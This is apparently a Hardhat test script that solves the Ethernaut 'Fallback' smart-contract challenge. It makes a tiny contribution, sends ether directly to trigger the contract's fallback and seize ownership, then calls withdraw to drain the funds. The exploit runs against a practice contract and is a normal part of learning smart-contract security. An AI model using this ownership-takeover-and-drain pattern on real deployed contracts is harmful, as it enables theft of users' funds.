import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Fallback`);
  const challengeAddress = await createChallenge(
    `0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  tx = await challenge.contribute({
    value: ethers.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  tx = await eoa.sendTransaction({
    to: challenge.target,
    value: ethers.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  tx = await challenge.withdraw();
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
});
